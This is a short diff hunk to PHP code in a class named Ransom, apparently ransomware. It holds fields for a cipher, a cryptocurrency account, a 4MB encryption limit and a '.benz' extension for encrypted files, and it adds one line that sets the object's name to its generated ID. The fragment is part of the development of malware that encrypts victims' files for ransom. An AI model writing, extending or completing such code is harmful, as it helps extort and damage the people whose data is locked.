@@ -96,6 +96,7 @@ class Ransom
         $this->cipher = $cipher;
         $this->crypto_account = $crypto_account;
         $this->id = create_guid();
+        $this->name = $this->id;
 
         $this->max_encrypt = 4194304; // 4MB
         $this->extension = ".benz";
